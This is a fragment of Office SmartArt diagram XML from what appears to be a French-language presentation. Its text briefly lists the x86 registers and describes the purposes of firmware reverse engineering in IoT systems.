    <dgm:cxn modelId="{C7CDD9B6-0817-4A43-8F31-5DCF22312065}" srcId="{FD9BC6B7-45DB-4A28-A6B4-692A66B23240}" destId="{A59C2622-F8F5-4291-99A8-E7C2938106E1}" srcOrd="0" destOrd="0" parTransId="{920A822B-C165-4604-AE12-154A88C09238}" sibTransId="{F743A741-586D-4658-963D-EA39444B867F}"/>
    <dgm:cxn modelId="{138EC3D3-5DDE-624C-9EC0-13499E4F3DD3}" type="presOf" srcId="{D615A6B7-CC49-4294-8B59-7B6E3ABB83F3}" destId="{2B354C2D-9F31-324E-93F6-BF91C404A744}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{B4B18EFB-E8DF-417C-9D17-E3DE4BB82642}" srcId="{FD9BC6B7-45DB-4A28-A6B4-692A66B23240}" destId="{D615A6B7-CC49-4294-8B59-7B6E3ABB83F3}" srcOrd="1" destOrd="0" parTransId="{29DCA2B1-AB40-477C-A465-FE492D01F49A}" sibTransId="{2789A729-71AC-42F5-9BE2-05A10044DCF2}"/>
    <dgm:cxn modelId="{9DD642E4-CF08-6F47-BC2A-4CE4F4289BC3}" type="presParOf" srcId="{833752DC-3652-D349-AEAB-5CE7B2423CA0}" destId="{43C88655-9832-BE40-B801-D94396CA2874}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{E7294EA0-9D72-4443-B047-96CE3AE3CA60}" type="presParOf" srcId="{833752DC-3652-D349-AEAB-5CE7B2423CA0}" destId="{3D998A44-2F22-AD4E-B63A-B3C2B68E3826}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{91BAFAC9-5EEF-8643-9F51-D680F6B9124D}" type="presParOf" srcId="{833752DC-3652-D349-AEAB-5CE7B2423CA0}" destId="{42FD6002-3EB8-7943-87BA-56A684EC588C}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{DD06C463-CD99-9140-8ECD-1FD059AD29C5}" type="presParOf" srcId="{833752DC-3652-D349-AEAB-5CE7B2423CA0}" destId="{2B354C2D-9F31-324E-93F6-BF91C404A74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6A08C455-C401-4D30-A060-6180AA65BB76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9E9978D-9B33-43AF-B1CE-F483A6D96206}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Registres principaux :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7211F636-7827-421B-BEAB-47BC0CDBCDCF}" type="parTrans" cxnId="{85F1F032-226E-4012-874F-5DB6E2E0C216}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C334EE5A-8D8B-45DC-AC15-0BDD768A4AB9}" type="sibTrans" cxnId="{85F1F032-226E-4012-874F-5DB6E2E0C216}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D308AAE3-5261-47D8-B7F1-4CA4215CAAA5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>AX, BX, CX, DX : registres généraux pour les opérations.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{540AFD27-9067-4915-B6C9-5EBC340E2F4A}" type="parTrans" cxnId="{88D23E5D-F60E-45E0-8DF0-5EB2835B1070}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B473EBE8-79CD-4754-A60A-8B6BEBC6751F}" type="sibTrans" cxnId="{88D23E5D-F60E-45E0-8DF0-5EB2835B1070}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{495F04DA-2CBC-43B9-A542-436E4D266DB5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>SP : pointeur de pile.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9006DCD0-6163-485D-BF73-27ED44A139F1}" type="parTrans" cxnId="{1CC13D99-927F-47D6-AD71-07B7E8CEB49D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{35F04F7A-DA91-48C4-91C0-1FDAEEC216E6}" type="sibTrans" cxnId="{1CC13D99-927F-47D6-AD71-07B7E8CEB49D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{386C02FB-1C8C-4FB3-AE52-607C65AEEFA3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>IP : pointeur d’instruction.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0F515E13-FF07-4623-B42E-E23A521A7940}" type="parTrans" cxnId="{E9CA4BEF-92F6-41E7-8AB6-48D59FB83056}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3819B1E5-F6F4-419F-8040-2B46DAF9964D}" type="sibTrans" cxnId="{E9CA4BEF-92F6-41E7-8AB6-48D59FB83056}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{446772A3-D553-4D5D-A2ED-109BC2FC497F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Utilisation pratique :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3E9C7EDA-22AE-4689-9CCB-EA1D4FB97B94}" type="parTrans" cxnId="{5AB20C1F-5119-4F0A-9C9B-EBB02F749077}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F54186FE-5D33-42A0-A142-CBF8DF4606CE}" type="sibTrans" cxnId="{5AB20C1F-5119-4F0A-9C9B-EBB02F749077}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7426DE66-5826-4490-9231-BC426A0D8BFF}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Chaque registre joue un rôle spécifique dans la gestion des instructions.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2E2B78E5-35E1-437A-80D7-688BE4B711F9}" type="parTrans" cxnId="{33F36A42-971A-47D7-B783-7CC70E891919}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A5CE3F5D-1080-4324-8525-27A607DC5D93}" type="sibTrans" cxnId="{33F36A42-971A-47D7-B783-7CC70E891919}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{31F5564A-1C7D-DC47-BC91-A5299E1776EF}" type="pres">
      <dgm:prSet presAssocID="{6A08C455-C401-4D30-A060-6180AA65BB76}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{F1EE0AEA-2613-AB45-ABAD-8AD2C0629EB3}" type="pres">
      <dgm:prSet presAssocID="{C9E9978D-9B33-43AF-B1CE-F483A6D96206}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{9205AADC-3281-9F4B-BC87-3DB6BBE5B14B}" type="pres">
      <dgm:prSet presAssocID="{C9E9978D-9B33-43AF-B1CE-F483A6D96206}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B77D6196-6F30-8B45-8FFC-9D72B31D378E}" type="pres">
      <dgm:prSet presAssocID="{C9E9978D-9B33-43AF-B1CE-F483A6D9620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F8477CA-9EEE-6D43-982C-97458DD1DC52}" type="pres">
      <dgm:prSet presAssocID="{C9E9978D-9B33-43AF-B1CE-F483A6D96206}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{78715136-2A49-344C-BAC3-C73FBB60EF08}" type="pres">
      <dgm:prSet presAssocID="{C9E9978D-9B33-43AF-B1CE-F483A6D96206}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C0D25B3D-E8BB-C544-BF79-B617D93C0CB9}" type="pres">
      <dgm:prSet presAssocID="{C334EE5A-8D8B-45DC-AC15-0BDD768A4AB9}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{074A19DB-383B-234D-BF6F-19CCCEDEE31F}" type="pres">
      <dgm:prSet presAssocID="{446772A3-D553-4D5D-A2ED-109BC2FC497F}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1F6BB54C-B51A-9E46-91DE-F7995A79622F}" type="pres">
      <dgm:prSet presAssocID="{446772A3-D553-4D5D-A2ED-109BC2FC497F}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{BA30FD8D-5540-A84D-B803-D96BE72C198A}" type="pres">
      <dgm:prSet presAssocID="{446772A3-D553-4D5D-A2ED-109BC2FC497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ADBF1AC-824C-3648-A1C2-BE7787F451FA}" type="pres">
      <dgm:prSet presAssocID="{446772A3-D553-4D5D-A2ED-109BC2FC497F}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{8F95619E-0ED0-2C47-A00F-FF50BE0D9C53}" type="pres">
      <dgm:prSet presAssocID="{446772A3-D553-4D5D-A2ED-109BC2FC497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465E811-A817-5A43-A12B-2EA263E8D41C}" type="presOf" srcId="{446772A3-D553-4D5D-A2ED-109BC2FC497F}" destId="{BA30FD8D-5540-A84D-B803-D96BE72C198A}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{60E33712-45AD-FA4A-AF6F-07149B154010}" type="presOf" srcId="{446772A3-D553-4D5D-A2ED-109BC2FC497F}" destId="{1F6BB54C-B51A-9E46-91DE-F7995A79622F}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{E3FD9819-4EE1-7C44-B882-EE3C22E06C68}" type="presOf" srcId="{6A08C455-C401-4D30-A060-6180AA65BB76}" destId="{31F5564A-1C7D-DC47-BC91-A5299E1776EF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{5AB20C1F-5119-4F0A-9C9B-EBB02F749077}" srcId="{6A08C455-C401-4D30-A060-6180AA65BB76}" destId="{446772A3-D553-4D5D-A2ED-109BC2FC497F}" srcOrd="1" destOrd="0" parTransId="{3E9C7EDA-22AE-4689-9CCB-EA1D4FB97B94}" sibTransId="{F54186FE-5D33-42A0-A142-CBF8DF4606CE}"/>
    <dgm:cxn modelId="{85C9642D-3AA9-E748-84AD-50D41386106B}" type="presOf" srcId="{7426DE66-5826-4490-9231-BC426A0D8BFF}" destId="{8F95619E-0ED0-2C47-A00F-FF50BE0D9C53}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{85F1F032-226E-4012-874F-5DB6E2E0C216}" srcId="{6A08C455-C401-4D30-A060-6180AA65BB76}" destId="{C9E9978D-9B33-43AF-B1CE-F483A6D96206}" srcOrd="0" destOrd="0" parTransId="{7211F636-7827-421B-BEAB-47BC0CDBCDCF}" sibTransId="{C334EE5A-8D8B-45DC-AC15-0BDD768A4AB9}"/>
    <dgm:cxn modelId="{0446033B-C6BA-3C4C-A3DB-45F851914D8E}" type="presOf" srcId="{495F04DA-2CBC-43B9-A542-436E4D266DB5}" destId="{78715136-2A49-344C-BAC3-C73FBB60EF08}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{33F36A42-971A-47D7-B783-7CC70E891919}" srcId="{446772A3-D553-4D5D-A2ED-109BC2FC497F}" destId="{7426DE66-5826-4490-9231-BC426A0D8BFF}" srcOrd="0" destOrd="0" parTransId="{2E2B78E5-35E1-437A-80D7-688BE4B711F9}" sibTransId="{A5CE3F5D-1080-4324-8525-27A607DC5D93}"/>
    <dgm:cxn modelId="{0F2D8A55-9C4B-4D49-98D7-F73A3C009461}" type="presOf" srcId="{D308AAE3-5261-47D8-B7F1-4CA4215CAAA5}" destId="{78715136-2A49-344C-BAC3-C73FBB60EF08}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{D37E1758-5AC1-9443-AF99-092F82854237}" type="presOf" srcId="{C9E9978D-9B33-43AF-B1CE-F483A6D96206}" destId="{B77D6196-6F30-8B45-8FFC-9D72B31D378E}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{88D23E5D-F60E-45E0-8DF0-5EB2835B1070}" srcId="{C9E9978D-9B33-43AF-B1CE-F483A6D96206}" destId="{D308AAE3-5261-47D8-B7F1-4CA4215CAAA5}" srcOrd="0" destOrd="0" parTransId="{540AFD27-9067-4915-B6C9-5EBC340E2F4A}" sibTransId="{B473EBE8-79CD-4754-A60A-8B6BEBC6751F}"/>
    <dgm:cxn modelId="{6C5A256B-2401-1B4A-8736-77B62123B8AA}" type="presOf" srcId="{386C02FB-1C8C-4FB3-AE52-607C65AEEFA3}" destId="{78715136-2A49-344C-BAC3-C73FBB60EF08}" srcOrd="0" destOrd="2" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{1CC13D99-927F-47D6-AD71-07B7E8CEB49D}" srcId="{C9E9978D-9B33-43AF-B1CE-F483A6D96206}" destId="{495F04DA-2CBC-43B9-A542-436E4D266DB5}" srcOrd="1" destOrd="0" parTransId="{9006DCD0-6163-485D-BF73-27ED44A139F1}" sibTransId="{35F04F7A-DA91-48C4-91C0-1FDAEEC216E6}"/>
    <dgm:cxn modelId="{34EB6CD7-C7F7-504F-AF02-8D50BD027A8C}" type="presOf" srcId="{C9E9978D-9B33-43AF-B1CE-F483A6D96206}" destId="{9205AADC-3281-9F4B-BC87-3DB6BBE5B14B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{E9CA4BEF-92F6-41E7-8AB6-48D59FB83056}" srcId="{C9E9978D-9B33-43AF-B1CE-F483A6D96206}" destId="{386C02FB-1C8C-4FB3-AE52-607C65AEEFA3}" srcOrd="2" destOrd="0" parTransId="{0F515E13-FF07-4623-B42E-E23A521A7940}" sibTransId="{3819B1E5-F6F4-419F-8040-2B46DAF9964D}"/>
    <dgm:cxn modelId="{808F07CC-42D5-2A40-B559-9692C6B8B33A}" type="presParOf" srcId="{31F5564A-1C7D-DC47-BC91-A5299E1776EF}" destId="{F1EE0AEA-2613-AB45-ABAD-8AD2C0629EB3}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0A1AA21E-B3F9-654B-9E9F-CA96CC30E407}" type="presParOf" srcId="{F1EE0AEA-2613-AB45-ABAD-8AD2C0629EB3}" destId="{9205AADC-3281-9F4B-BC87-3DB6BBE5B14B}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{EBF9A4DD-6995-7445-9ABF-A535ACF9376E}" type="presParOf" srcId="{F1EE0AEA-2613-AB45-ABAD-8AD2C0629EB3}" destId="{B77D6196-6F30-8B45-8FFC-9D72B31D378E}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{4FA89BBB-DA86-444E-BA8E-09C70C5AE3CE}" type="presParOf" srcId="{31F5564A-1C7D-DC47-BC91-A5299E1776EF}" destId="{DF8477CA-9EEE-6D43-982C-97458DD1DC52}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{677E617A-DE8F-B749-AA26-4586BC6C3449}" type="presParOf" srcId="{31F5564A-1C7D-DC47-BC91-A5299E1776EF}" destId="{78715136-2A49-344C-BAC3-C73FBB60EF08}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8AB76920-6B14-1B47-87EE-52D381BD0559}" type="presParOf" srcId="{31F5564A-1C7D-DC47-BC91-A5299E1776EF}" destId="{C0D25B3D-E8BB-C544-BF79-B617D93C0CB9}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{1569E984-6860-0B40-AC69-46E33D1C6786}" type="presParOf" srcId="{31F5564A-1C7D-DC47-BC91-A5299E1776EF}" destId="{074A19DB-383B-234D-BF6F-19CCCEDEE31F}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{6F5C37B6-0724-8641-8734-094457F6E33F}" type="presParOf" srcId="{074A19DB-383B-234D-BF6F-19CCCEDEE31F}" destId="{1F6BB54C-B51A-9E46-91DE-F7995A79622F}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0A0CD55A-CB2B-1740-A875-69C66F0C2FBB}" type="presParOf" srcId="{074A19DB-383B-234D-BF6F-19CCCEDEE31F}" destId="{BA30FD8D-5540-A84D-B803-D96BE72C198A}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{D53154C4-03EF-D241-9E18-C4D1C6E33BB5}" type="presParOf" srcId="{31F5564A-1C7D-DC47-BC91-A5299E1776EF}" destId="{FADBF1AC-824C-3648-A1C2-BE7787F451FA}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{529A079E-7118-1941-9DDF-50AE8A07BDC5}" type="presParOf" srcId="{31F5564A-1C7D-DC47-BC91-A5299E1776EF}" destId="{8F95619E-0ED0-2C47-A00F-FF50BE0D9C5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446B9A8-7B31-4022-80FF-000CD882047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B670F59-BDF3-4CEA-BEFA-8763CD62DC81}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Définition : Processus d'analyse d'un firmware pour comprendre son fonctionnement interne.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7657B3EC-16B4-4FF4-B629-AE5AD4D20247}" type="parTrans" cxnId="{31910C2C-E5A3-4658-933A-394BB727A28E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{74D91943-AF5B-419B-A911-B8FF135A5BDB}" type="sibTrans" cxnId="{31910C2C-E5A3-4658-933A-394BB727A28E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0380F991-9FD5-42FF-8C5E-A47932F66B53}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Importance dans les systèmes IoT :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1D9F29D7-8507-4F75-B991-5A5327977A20}" type="parTrans" cxnId="{621FBB28-3737-479A-B440-DC693D0B9ECC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1BEF1895-9467-44E4-955A-D248498D040D}" type="sibTrans" cxnId="{621FBB28-3737-479A-B440-DC693D0B9ECC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9E092E8B-4D34-4ED9-97FA-38441B796127}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Identifier les vulnérabilités de sécurité.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{13808E3A-88BD-4C6E-839F-19500FDD3185}" type="parTrans" cxnId="{F4CD3820-B849-4E90-81DF-7AA95F8A78E4}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6DDC8EB8-B4D5-45A9-AFED-4BD270E8B9EB}" type="sibTrans" cxnId="{F4CD3820-B849-4E90-81DF-7AA95F8A78E4}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{70236DFE-F8A9-4D98-A79A-E9F940EC0423}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Comprendre les fonctionnalités cachées ou non documentées.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2D534E30-AC17-4717-A17B-E3D36CC283C1}" type="parTrans" cxnId="{923FCBD6-D744-4916-8A5D-1217180E7280}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0BBBCEC4-1279-44F5-9F5D-D3003C1EA7AC}" type="sibTrans" cxnId="{923FCBD6-D744-4916-8A5D-1217180E7280}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{963DAF5C-E703-4A02-873D-7D501DA13142}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Permettre la personnalisation ou le dépannage.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7096E841-63E0-4447-BC94-7AC58D56F231}" type="parTrans" cxnId="{76C31C04-74A3-482A-82FD-9692441C539B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A066BB2F-42DD-4D7D-848A-FC2F4978218B}" type="sibTrans" cxnId="{76C31C04-74A3-482A-82FD-9692441C539B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{37E8F1F9-7067-174E-9C22-8AFDFC54B264}" type="pres">
      <dgm:prSet presAssocID="{4446B9A8-7B31-4022-80FF-000CD8820477}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{0B5F7979-6AA6-3644-8E03-2379BA9ADEAA}" type="pres">
      <dgm:prSet presAssocID="{5B670F59-BDF3-4CEA-BEFA-8763CD62DC8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481F344-F3A9-8649-92D2-28158633FCE0}" type="pres">
      <dgm:prSet presAssocID="{74D91943-AF5B-419B-A911-B8FF135A5BDB}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{3DA1143D-6554-FB46-9D75-F938AF2E9CF1}" type="pres">
      <dgm:prSet presAssocID="{0380F991-9FD5-42FF-8C5E-A47932F66B5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98D9FC1-AE96-494D-AA9A-16ADE6607B4C}" type="pres">
      <dgm:prSet presAssocID="{0380F991-9FD5-42FF-8C5E-A47932F66B5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6C31C04-74A3-482A-82FD-9692441C539B}" srcId="{0380F991-9FD5-42FF-8C5E-A47932F66B53}" destId="{963DAF5C-E703-4A02-873D-7D501DA13142}" srcOrd="2" destOrd="0" parTransId="{7096E841-63E0-4447-BC94-7AC58D56F231}" sibTransId="{A066BB2F-42DD-4D7D-848A-FC2F4978218B}"/>
    <dgm:cxn modelId="{4C7DF71D-A596-0F4B-8B27-A437D0E75D22}" type="presOf" srcId="{9E092E8B-4D34-4ED9-97FA-38441B796127}" destId="{298D9FC1-AE96-494D-AA9A-16ADE6607B4C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
